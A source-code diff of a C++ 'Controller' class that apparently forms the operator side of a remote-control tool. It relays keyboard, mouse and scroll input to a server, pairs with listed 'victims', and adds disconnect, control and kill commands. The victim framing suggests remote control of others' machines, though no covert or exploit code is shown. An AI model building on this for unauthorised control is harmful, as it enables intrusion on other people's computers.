@@ -9,36 +9,39 @@ Controller::Controller()
     std::thread input(&Controller::takeCmdInput, this);
     input.detach();
 }
-
 void Controller::controlWindow()
 {
     bool keys[255];
     for (int i = 0; i < 256; i++)
         keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
 
-    while (true)
-    {
-        if (!isConnected) {
-            std::cout << "DISCONNECTED FROM SERVER\n";
-            controllers.clear();
-            victims.clear();
-            connectServer();
-            std::thread receive(&Controller::receiveInfo, this);
-            receive.detach();
-        }
-
-        //open window if needed or skip is not controlling
-        if (!w.isOpen())
-        {
-            if (isControlling) {
-                w.create(sf::VideoMode(0, 0), "Controller", sf::Style::Fullscreen);
+    while (isRunning) {
+        //open window - connect server - skip
+        if (!w.isOpen()) {
+            if (isControlling && isRunning) {
+                w.create(sf::VideoMode(), "Controller", sf::Style::Fullscreen);
                 w.setFramerateLimit(20);
+                sf::Packet p;
+                p << sf::Uint8('a');
+                server.send(p);
             }
-            else
+            else if (isConnected && isRunning) {
                 continue;
+            }
+            else if (isRunning) {
+                std::cout << "DISCONNECTED FROM SERVER\n";
+                controllers.clear();
+                victims.clear();
+                connectServer();
+                std::thread receive(&Controller::receiveInfo, this);
+                receive.detach();
+            }
         }
         else if (!isControlling || !isPaired) {
             w.close();
+            sf::Packet p;
+            p << sf::Uint8('a');
+            server.send(p);
         }
 
         sf::Event e;
@@ -46,26 +49,28 @@ void Controller::controlWindow()
             if (e.type == sf::Event::Closed) {
                 w.close();
                 isControlling = false;
-                //socket->send("a", 1, SERVER_IP, SERVER_PORT);
+                sf::Packet p;
+                p << sf::Uint8('a');
+                server.send(p);
             }
-            //else if (e.type == sf::Event::MouseWheelScrolled)
-            //{
-            //    std::string str = "k";
-            //    str = str + char(e.mouseWheelScroll.delta);
-            //    socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
-            //}
-            //else if (e.type == sf::Event::MouseMoved)
-            //{
-            //    std::string str = "l";
-            //    float x = e.mouseMove.x / float(screenSize.x), y = e.mouseMove.y / float(screenSize.y);
-            //    str = str + char(x * 255) + char(y * 255);
-            //    socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
-            //}
+            else if (e.type == sf::Event::MouseWheelScrolled)
+            {
+                sf::Packet p;
+                p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
+                server.send(p);
+            }   
+        }
+
+        auto mousePos = Mlib::Mouse::getPos();
+        if (mousePos != lastMousePos) {
+            float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
+            sf::Packet p;
+            p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
+            server.send(p);
         }
 
         //send key pressed-released events if needed
-        for (int i = 0; i < 256; i++)
-        {
+        for (int i = 0; i < 256; i++) {
             bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
             if (!state && keys[i]) {
                 sf::Packet p;
@@ -79,6 +84,8 @@ void Controller::controlWindow()
             }
             keys[i] = state;
         }
+
+        lastMousePos = mousePos;
 
         w.clear(sf::Color(30, 30, 30));
         w.display();
@@ -133,19 +140,18 @@ void Controller::receiveInfo()
             isPaired = true;
             isControlling = false;
         }
-        /*//un-pair controller with victim
-        else if (msg[0] == 'u')
+        //un-pair controller with victim
+        else if (cmd == 'u')
         {
             isPaired = false;
             isControlling = false;
         }
         //exit program
-        else if (msg[0] == 'e') {
+        else if (cmd == 'e') {
             isRunning = false;
-        }*/
+        }
     }
 }
-
 void Controller::takeCmdInput()
 {
     std::string cmd;
@@ -179,14 +185,16 @@ void Controller::takeCmdInput()
                 break;
             }
         }
-        /*else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
-            socket->send("u", 1, SERVER_IP, SERVER_PORT);
-        }*/
+        else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
+            sf::Packet p;
+            p << sf::Uint8('u');
+            server.send(p);
+        }
         else if (cmd.substr(0, 7) == "control" && isPaired) {
             isControlling = true;
         }
-        /*else if (cmd.substr(0, 8) == "unalivec") {
-            cmd.erase(0, 8);
+        else if (cmd.substr(0, 4) == "kill") {
+            cmd.erase(0, 4);
             int num = 0;
             try {
                 num = stoi(cmd);
@@ -198,32 +206,25 @@ void Controller::takeCmdInput()
                 continue;
             }
 
-            if (num >= 0 && num < controllers.size())
-            {
-                std::string msg = "e" + controllers[num].ip + ";" + std::to_string(controllers[num].port) + ";";
-                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
-            }
-        }
-        else if (cmd.substr(0, 8) == "unalivev") {
-            cmd.erase(0, 8);
-            int num = 0;
-            try {
-                num = stoi(cmd);
-            }
-            catch (std::invalid_argument e) {
-                continue;
-            }
-            catch (std::out_of_range e) {
-                continue;
-            }
+            for (auto v : victims) {
+                if (v.id != num)
+                    continue;
 
-            if (num >= 0 && num < victims.size())
-            {
-                std::string msg = "e" + victims[num].ip + ";" + std::to_string(victims[num].port) + ";";
-                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
+                sf::Packet p;
+                p << sf::Uint8('e') << v.id;
+                server.send(p);
+                break;
+            }
+            for (auto c : controllers) {
+                if (c.id != num)
+                    continue;
+
+                sf::Packet p;
+                p << sf::Uint8('e') << c.id;
+                server.send(p);
+                break;
             }
         }
-        */
     }
 }
 
@@ -247,7 +248,6 @@ init:
 
     isConnected = true;
 }
-
 void Controller::displayList()
 {
     system("CLS");
